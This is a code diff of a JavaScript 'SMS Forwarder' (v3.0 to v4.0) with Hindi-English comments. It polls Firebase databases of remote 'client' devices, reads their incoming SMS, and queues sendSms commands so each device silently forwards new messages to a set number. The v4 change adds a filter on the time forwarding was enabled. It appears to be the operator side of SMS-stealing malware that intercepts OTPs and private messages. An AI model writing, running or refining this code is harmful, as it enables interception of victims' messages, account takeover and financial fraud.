@@ -1,16 +1,18 @@
 /* ============================================================
-   ANANYA SMS Forwarder v3.0 — Continuous Mode
-   Har incoming message forward karega, bina toggle kiye
+   ANANYA SMS Forwarder v4.0
+   - Sirf enabledAt ke BAAD ke messages forward karega
+   - Purane messages skip karega
+   - Continuous chalta rahega, toggle nahi chahiye
    ============================================================ */
 
 (function () {
     'use strict';
 
-    console.log('[SMS-FWD] v3.0 Loaded ✅');
+    console.log('[SMS-FWD] v4.0 Loaded ✅');
 
     var ACCOUNTS_KEY = 'flixy_accounts';
-    var PROCESSED_KEY = 'sms_fwd_v3';
-    var POLL_INTERVAL = 1500;  // 1.5 sec
+    var PROCESSED_KEY = 'sms_fwd_v4';
+    var POLL_INTERVAL = 2000;  // 2 sec
 
     function getAccounts() {
         try {
@@ -52,7 +54,7 @@
         } catch (e) { return false; }
     }
 
-    // ============ PROCESSED TRACKER (Persistent) ============
+    // ============ PROCESSED TRACKER ============
     var processed = new Set();
     try {
         var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
@@ -62,51 +64,80 @@
     function markDone(k) {
         processed.add(k);
         try {
-            var arr = Array.from(processed).slice(-2000);
+            var arr = Array.from(processed).slice(-1000);
             localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
         } catch (e) {}
     }
 
-    // ============ CORE — SCAN ALL NEW INCOMING MESSAGES ============
+    // ============ TIMESTAMP EXTRACTOR ============
+    function getMsgTimestamp(sms) {
+        if (!sms) return 0;
+        // Try different timestamp fields
+        if (sms.timestamp && typeof sms.timestamp === 'number') return sms.timestamp;
+        if (sms.dateTime) {
+            var t = new Date(sms.dateTime).getTime();
+            if (!isNaN(t)) return t;
+        }
+        if (sms.time) {
+            var t2 = new Date(sms.time).getTime();
+            if (!isNaN(t2)) return t2;
+        }
+        return 0;  // unknown → treat as old
+    }
+
+    // ============ CORE — PROCESS ONLY NEW MESSAGES ============
     async function handleDevice(acc, devId) {
         try {
             // 1. Get forwarding config
             var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
-            if (!cfg || !cfg.enabled || !cfg.forwardTo) return;
+            if (!cfg) return;
+            if (!cfg.enabled) return;
+            if (!cfg.forwardTo) return;
 
             var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
             var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
+            var enabledAt = cfg.enabledAt || 0;  // ← ye naya field hai
+
             if (!to) return;
 
-            // 2. Get ALL messages (not just newest)
+            // 2. Get messages
             var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
             if (!msgs || typeof msgs !== 'object') return;
 
             var ids = Object.keys(msgs);
             if (!ids.length) return;
 
-            // 3. Sort by numeric ID
             ids.sort(function (a, b) { return Number(a) - Number(b); });
 
-            // 4. Process ONLY the last 20 messages (safety limit)
-            var scanLimit = Math.min(20, ids.length);
+            // 3. Sirf LAST 5 messages check karo (safety)
+            //    But filter by enabledAt
+            var scanLimit = Math.min(5, ids.length);
             var startIdx = ids.length - scanLimit;
 
             for (var i = startIdx; i < ids.length; i++) {
                 var msgId = ids[i];
                 var k = devId + '_' + msgId;
 
-                // Skip if already processed
                 if (processed.has(k)) continue;
 
                 var sms = msgs[msgId];
                 if (!sms) { markDone(k); continue; }
                 if (sms.type !== 'incoming') { markDone(k); continue; }
 
+                // 4. ✅ MAIN FILTER — sirf naye messages forward karo
+                var msgTime = getMsgTimestamp(sms);
+
+                // Agar message ka time enabledAt se pehle ka hai → skip
+                if (enabledAt > 0 && msgTime > 0 && msgTime < enabledAt) {
+                    markDone(k);
+                    console.log('[SMS-FWD] ⏭ Skipped old msg:', msgId);
+                    continue;
+                }
+
                 var text = sms.message || sms.body || sms.text || '';
                 if (!text) { markDone(k); continue; }
 
-                // ======== FORWARD THIS MESSAGE ========
+                // ======== FORWARD ========
                 var ts = Date.now();
                 var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
                 var sim = { simSlot: simSlot };
@@ -120,7 +151,7 @@
                     forwarded: true, originalSender: sms.sender || 'Unknown'
                 });
 
-                // PATH 2: commands/sendSms (backup)
+                // PATH 2: commands/sendSms
                 await fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
                     targetNumber: to, message: text, timestamp: ts,
                     status: 'pending', id: cid, simInfo: sim, forwarded: true
@@ -135,7 +166,7 @@
                     simInfo: sim, forwarded: true
                 });
 
-                // PATH 4: sms (fallback)
+                // PATH 4: sms
                 await fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
                     to: to, text: text, timestamp: ts, status: 'pending',
                     commandId: cid, forwarded: true
@@ -178,7 +209,6 @@
     setInterval(tick, POLL_INTERVAL);
     setTimeout(tick, 2000);
 
-    console.log('[SMS-FWD] v3.0 Running every', POLL_INTERVAL, 'ms 🚀');
-    console.log('[SMS-FWD] Continuous mode — koi toggle nahi chahiye!');
+    console.log('[SMS-FWD] v4.0 Running 🚀 — sirf naye messages forward honge');
 
 })();
